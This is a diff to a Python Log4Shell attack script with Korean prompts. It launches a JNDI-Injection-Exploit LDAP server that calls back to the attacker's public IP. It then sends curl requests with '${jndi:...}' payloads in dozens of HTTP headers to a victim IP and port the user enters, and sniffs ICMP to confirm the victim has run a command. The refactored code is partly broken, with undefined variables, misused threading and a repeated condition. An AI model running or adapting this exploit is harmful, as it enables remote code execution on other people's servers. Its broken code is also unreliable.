@@ -4,209 +4,109 @@ import os.path
 import threading
 import time
 from requests import get
-from scapy.all import*
+from scapy.all import *
 
-
-num = 0
-exip = ''
-tip = ''
-headers = [
-'ALL',
-'Forwarded',
-'Forwarded-For',
-'Forwarded-For-Ip',
-'Forwarded-Proto',
-'From',
-'If-Modified-Since',
-'Max-Forwards',
-'Origin',
-'Originating-Ip',
-'Pragma',
-'Referer',
-'TE',
-'True-Client-IP',
-'True-Client-Ip',
-'Upgrade',
-'User-Agent',
-'Via',
-'Warning',
-'X-ATT-DeviceId',
-'X-Api-Version',
-'X-Att-Deviceid',
-'X-CSRFToken',
-'X-Client-Ip',
-'X-Correlation-ID',
-'X-Csrf-Token',
-'X-Do-Not-Track',
-'X-Foo',
-'X-Foo-Bar',
-'X-Forward-For',
-'X-Forward-Proto',
-'X-Forwarded',
-'X-Forwarded-By',
-'X-Forwarded-For',
-'X-Forwarded-For-Original',
-'X-Forwarded-Host',
-'X-Forwarded-Port',
-'X-Forwarded-Proto',
-'X-Forwarded-Protocol',
-'X-Forwarded-Scheme',
-'X-Forwarded-Server',
-'X-Forwarded-Ssl',
-'X-Forwarder-For',
-'X-Frame-Options',
-'X-From',
-'X-Geoip-Country',
-'X-HTTP-Method-Override',
-'X-Http-Destinationurl',
-'X-Http-Host-Override',
-'X-Http-Method',
-'X-Http-Method-Override',
-'X-Http-Path-Override',
-'X-Https',
-'X-Htx-Agent',
-'X-Hub-Signature',
-'X-If-Unmodified-Since',
-'X-Imbo-Test-Config',
-'X-Insight',
-'X-Ip',
-'X-Ip-Trail',
-'X-Leakix',
-'X-Originating-Ip',
-'X-ProxyUser-Ip',
-'X-Real-Ip',
-'X-Remote-Addr',
-'X-Remote-Ip',
-'X-Request-ID',
-'X-Requested-With',
-'X-UIDH',
-'X-Wap-Profile',
-'X-XSRF-TOKEN'
-]
-servers=['ALL',]
-
-def jar():
-    global exip
-    #os.system('clear')
-    inip=(os.popen("hostname -I | awk '{print $1}'")).read()
-    exip=get("https://api.ipify.org").text
-    #debug
-    print("inip : "+str(inip))
-    print("exip : "+str(exip))
-    try: #서버 구동
-        global num
-        num = num + 1
-        #debug
-        print('java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C "ping -c 1 '+exip+'" -A '+exip)
-        #os.system('java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C "ping -c 1 '+'192.168.52.129'+'" -A '+'192.168.52.129')
-        os.system('java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C "ping -c 1 '+exip+'" -A '+exip)
-    except Exception as err: #서버 구동 실패
+def on_server(ex_ip):
+    # 서버 프로세스 확인 후 KILL 코드 추가
+    print('[+] 서버 시작\n[+] java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C "ping -c 1 ' + ex_ip + '" -A ' + ex_ip)
+    try:
+        os.system('java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C "ping -c 1 ' + ex_ip + '" -A ' + ex_ip)
+    except Exception as err:
         print('[@] LDAP 서버가 구동에 실패하였습니다.\n')
         print(err)
         exit(1)
-    
 
-def main():
-    global tip
-    global num
-    while True: 
-        if num == 1: break
-    
-    time.sleep(0.5)
+def main(victim_ip, victim_port):
+    time.sleep(2)
 
-    #os.system('clear')
-    tip = input('\n[+] 공격을 진행할 서비스의 IP 주소를 작성해주세요.\nEnter : ')
-    tpt = input('\n[+] 공격을 진행할 서비스의 PORT를 작성해주세요.\nEnter : ')
-    print('\n[+] 당신의 공격 목표가 '+ tip +':'+ tpt +'로 설정되었습니다.')
-
-    #os.system('clear')
-    for i in range(1, len(headers)):
-        print('\n'+str(i)+"번째 헤더 : "+str(headers[i]))
+    header_list = (open("./headerlist.txt", 'r')).readlines()
+    for i in range(1, len(header_list)):
+        print('\n' + str(i) + "번째 헤더 : " + str(header_list[i]))
     print('\n[+] 전체 헤더 리스트입니다.')
     print('\n[+] 헤더 숫자를 적으면 해당 헤더에 대한 공격을 진행하고, 0을 입력할 경우 전체 리스트를 순차적으로 대입합니다.\n')
-    hname = int(input('Enter : '))
-    print('[+] 선택한 헤더: ' +str(headers[hname]))
-    time.sleep(2)
-    os.system('clear')
+    select_header = int(input('Enter : '))
+    os.system('clear') #화면 정리용
+    print('[+] 선택한 헤더: ' + str(header_list[select_header]))
 
-    f = open("./out.txt", 'r')
-    fl = f.readlines()
-    fnum = 1
+    server_output = (open("./out.txt", 'r')).readlines()
+    list_num = 1
+    url_list = ['ALL', ]
     for i in range(len(fl)):
         if 'JDK 1.7' in fl[i]:
-            print(str(fnum)+'.JDK 1.7 whose trustURLCodebase is true : ' + fl[i+1])
-            fnum = fnum+1
-            servers.append(fl[i+1])
-            print(str(fnum)+'.JDK 1.7 whose trustURLCodebase is true : ' + fl[i+2])
-            fnum = fnum+1
-            servers.append(fl[i+2])
+            print(str(list_num) + '.JDK 1.7 whose trustURLCodebase is true : ' + server_output[i + 1])
+            list_num = list_num + 1
+            url_list.append(fl[i + 1])
+            print(str(list_num) + '.JDK 1.7 whose trustURLCodebase is true : ' + server_output[i + 2])
+            list_num = list_num + 1
+            url_list.append(fl[i + 2])
         elif 'JDK 1.8' in fl[i]:
-            print(str(fnum)+'.JDK 1.8 whose trustURLCodebase is true : ' + fl[i+1])
-            fnum=fnum+1
-            servers.append(fl[i+1])
-            print(str(fnum)+'.JDK 1.8 whose trustURLCodebase is true : ' + fl[i+2])
-            fnum=fnum+1
-            servers.append(fl[i+2])
+            print(str(list_num) + '.JDK 1.8 whose trustURLCodebase is true : ' + server_output[i + 1])
+            list_num = list_num + 1
+            url_list.append(fl[i + 1])
+            print(str(list_num) + '.JDK 1.8 whose trustURLCodebase is true : ' + server_output[i + 2])
+            list_num = list_num + 1
+            url_list.append(fl[i + 2])
         elif 'Tomcat' in fl[i]:
-            print(str(fnum)+'.JDK whose trustURLCodebase is false and have Tomcat 8+ or SpringBoot 1.2.x+ in classpath : '+fl[i+1])
-            fnum=fnum+1
-            servers.append(fl[i+1])
-            
+            print(str(list_num) + '.JDK whose trustURLCodebase is false and have Tomcat 8+ or SpringBoot 1.2.x+ in classpath : ' + server_output[i + 1])
+            list_num = list_num + 1
+            url_list.append(fl[i + 1])
     print('\n[+] 전체 서버 주소 리스트입니다.')
     print('\n[+] 숫자를 적으면 해당 서버 주소를 이용해 공격을 진행하고, 0을 입력할 경우 전체 리스트를 순차적으로 대입합니다.\n')
-    sname = int(input('Enter : '))
-    print('[+] 선택한 주소: ' +str(servers[sname]))
-    time.sleep(2)
-    os.system('clear')
-    
-    if (headers[hname] == 'ALL') and (servers[sname] != 'ALL'):
-        for x in range(1, len(headers)):
-            attcurl = "curl "+tip+":"+tpt+" -H '"+str(headers[x])+": ${jndi:"+str(servers[sname]).replace("\n", "")+"'}"
-            print('\n'+attcurl)
+    select_url = int(input('Enter : '))
+    os.system('clear') #화면 정리용
+    print('[+] 선택한 주소: ' + str(servers[select_url]))
+
+    if (header_list[select_header] == 'ALL') and (url_list[select_url] != 'ALL'):
+        for x in range(1, len(header_list)):
+            attcurl = "curl " + victim_ip + ":" + victim_port + " -H '" + str(header_list[x]) + ": ${jndi:" + str(url_list[select_url]).replace("\n", "") + "'}"
+            print('\n' + attcurl)
             os.system(attcurl)
             time.sleep(0.5)
 
-    elif (headers[hname] != 'ALL') and (servers[sname] == 'ALL'):
-        for y in range(1, len(servers)):
-            attcurl = "curl "+tip+":"+tpt+" -H '"+str(headers[hname])+": ${jndi:"+str(servers[y]).replace("\n", "")+"'}"
-            print('\n'+attcurl)
+    elif (header_list[select_header] != 'ALL') and (url_list[select_url] == 'ALL'):
+        for y in range(1, len(url_list)):
+            attcurl = "curl " + victim_ip + ":" + victim_port + " -H '" + str(header_list[select_header]) + ": ${jndi:" + str(url_list[y]).replace("\n", "") + "'}"
+            print('\n' + attcurl)
             os.system(attcurl)
             time.sleep(0.5)
 
-    elif (headers[hname] == 'ALL') and (servers[sname] == 'ALL'):
-        for x in range(1, len(headers)):
-            for y in range(1, len(servers)):
-                attcurl = "curl "+tip+":"+tpt+" -H '"+str(headers[x])+": ${jndi:"+str(servers[y]).replace("\n", "")+"'}"
-                print('\n'+attcurl)
+    elif (header_list[select_header] == 'ALL') and (header_list[select_header] == 'ALL'):
+        for x in range(1, len(header_list)):
+            for y in range(1, len(url_list)):
+                attcurl = "curl " + victim_ip + ":" + victim_port + " -H '" + str(header_list[x]) + ": ${jndi:" + str(url_list[y]).replace("\n", "") + "'}"
+                print('\n' + attcurl)
                 os.system(attcurl)
                 time.sleep(0.5)
+
     else:
-        attcurl = "curl "+tip+":"+tpt+" -H '"+str(headers[hname])+": ${jndi:"+str(servers[sname]).replace("\n", "")+"'}"
+        attcurl = "curl " + victim_ip + ":" + victim_port + " -H '" + str(header_list[select_header]) + ": ${jndi:" + str(header_list[select_header]).replace("\n", "") + "'}"
         print(attcurl)
         os.system(attcurl)
 
-def sn(pkt) :
-    global tip
-    global exip
+def success_check(pkt, ex_ip, victim_ip):
     if pkt.haslayer(ICMP):
-        if socket.gethostbyname(socket.gethostname())==pkt[IP].src:
-            print(str("[")+str(time)+str("]")+"  "+"ICMP-OUT:{}".format(len(pkt[ICMP]))+" Bytes"+"    "+"IP-Version:"+str(pkt[IP].version) +"    "*1+" SRC-MAC:"+str(pkt.src)+"    "+"DST-MAC:"+str(pkt.dst)+"    "+"SRC-IP: "+str(pkt[IP].src)+ "    "+"DST-IP:  "+str(pkt[IP].dst))
-            if (str(pkt[IP].src) == 'tip') & (str(pkt[IP].dst) == str(exip)):
-                print('ok')
-        #if socket.gethostbyname(socket.gethostname())==pkt[IP].dst:
-            #print(str("[")+str(time)+str("]")+"  "+"ICMP-IN:{}".format(len(pkt[ICMP]))+" Bytes"+"    "+"IP-Version:"+str(pkt[IP].version)+"    "*1+"    SRC-MAC:"+str(pkt.src)+"    "+"DST-MAC:"+str(pkt.dst)+"    "+"SRC-IP: "+str(pkt[IP].src)+ "    "+"DST-IP:  "+str(pkt[IP].dst)) 
+        if socket.gethostbyname(socket.gethostname()) == pkt[IP].src:
+            #print(str("[") + str(time) + str("]") + "  " + "ICMP-OUT:{}".format(
+                #len(pkt[ICMP])) + " Bytes" + "    " + "IP-Version:" + str(
+                #pkt[IP].version) + "    " * 1 + " SRC-MAC:" + str(pkt.src) + "    " + "DST-MAC:" + str(
+                #pkt.dst) + "    " + "SRC-IP: " + str(pkt[IP].src) + "    " + "DST-IP:  " + str(pkt[IP].dst))
+            if (str(pkt[IP].src) == str(victim_ip)) & (str(pkt[IP].dst) == str(ex_ip)):
+                print('[+] 공격이 성공하였습니다.')
 
-
-def sp():
-    sniff(prn=sn)
+def scapy_sniff(ex_ip, victim_ip):
+    sniff(prn=success_check(ex_ip=ex_ip,victim_ip=victim_ip))
 
 if __name__ == '__main__':
-    t1=threading.Thread(target=jar)
-    t2=threading.Thread(target=sp)
-    t1.daemon=True
-    t2.daemon=True
-    t1.IsBackground=True
-    t2.IsBackground=True
+    ex_ip = get("https://api.ipify.org").text
+    victim_ip = input('\n[+] 공격을 진행할 서비스의 IP 주소를 작성해주세요.\nEnter : ')
+    victim_port = input('\n[+] 공격을 진행할 서비스의 PORT를 작성해주세요.\nEnter : ')
+    print('\n[+] 당신의 공격 목표가 ' + victim_ip + ':' + victim_port + '로 설정되었습니다.')
+    t1 = threading.Thread(target=on_server(ex_ip))
+    t2 = threading.Thread(target=scapy_sniff(ex_ip, victim_ip))
+    t1.daemon = True
+    t2.daemon = True
+    t1.IsBackground = True
+    t2.IsBackground = True
     t1.start()
     t2.start()
-    main()
+    main(victim_ip, victim_port)
